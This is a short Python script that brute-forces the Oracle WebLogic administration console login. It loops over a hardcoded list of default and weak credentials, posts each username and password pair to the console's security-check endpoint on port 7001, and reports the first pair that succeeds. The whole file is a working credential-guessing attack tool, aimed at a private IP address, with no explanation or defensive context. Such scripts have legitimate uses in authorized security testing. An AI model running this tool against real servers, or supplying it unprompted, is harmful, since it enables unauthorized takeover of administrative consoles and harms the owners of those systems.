#!/usr/bin/env python           
# coding  : utf-8 
# Date    : 2020/11/11
# Author  : Al1ex

import requests
 
class WebLogic:
    def __init__(self, url):
        if '://' not in url:
            url = 'http://' + url
        self.url = url.strip('/')
 
    def weakPasswd(self):
 
        pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe', 'wlcsystem', 'wlpisystem','admin123']
        for user in pwddict:
            for pwd in pwddict:
                data = {
                    'j_username':user,
                    'j_password':pwd,
                    'j_character_encoding':'UTF-8'
                }
                req = requests.post(self.url+':7001/console/j_security_check', data=data, allow_redirects=False, verify=False)
                if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                    print('[+] WebLogic username: '+user+'  password: '+pwd)
                    exit()
 
if __name__ == '__main__':
    url = '192.168.174.144'
    wls = WebLogic(url)
        
    wls.weakPasswd()